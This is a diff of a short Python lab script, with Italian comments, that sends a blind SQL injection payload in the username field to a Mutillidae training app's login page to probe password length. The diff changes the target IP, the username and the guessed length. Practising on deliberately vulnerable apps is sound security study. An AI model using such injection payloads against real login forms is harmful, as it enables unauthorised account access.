@@ -4,16 +4,16 @@ alphabet = string.printable
 
 print(alphabet)
 print(len(alphabet))
-url = "http://192.168.122.123/mutillidae/index.php?page=login.php" #cambiare l'ip con quello impostato dal dhcp
+url = "http://192.168.122.182/mutillidae/index.php?page=login.php" #cambiare l'ip con quello impostato dal dhcp
 
 data = {
-    'username': "simba' AND LENGTH(password)=8 -- ",
+    'username': "john' AND LENGTH(password)=6 -- ",
     'password': "",
     'login-php-submit-button': "Login",
 }
 
 response = requests.post(url, data=data)
-
+print("PRINTING RESPONSE INFO")
 print("Status Code", response.status_code)
 print("JSON Response ", len(response.text))
 
